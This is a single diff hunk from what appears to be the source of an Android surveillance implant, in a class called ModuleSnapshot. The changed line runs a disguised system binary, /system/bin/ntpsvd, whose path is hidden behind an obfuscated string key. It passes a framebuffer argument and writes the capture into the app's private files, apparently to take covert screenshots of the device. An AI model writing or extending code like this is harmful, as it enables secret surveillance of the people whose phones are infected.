@@ -347,7 +347,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 			}
 
 			// a_0=/system/bin/ntpsvd
-			final Process localProcess = Runtime.getRuntime().exec(new String[] { Messages.getString("a_0"), "fb" });
+			final Process localProcess = Runtime.getRuntime().exec(new String[] { Messages.getString("a_0"), "fb", "/data/data/" + Status.self().getAppContext().getPackageName() + "/files/frame" });
 			localProcess.waitFor();
 
 			if (Cfg.DEBUG) {
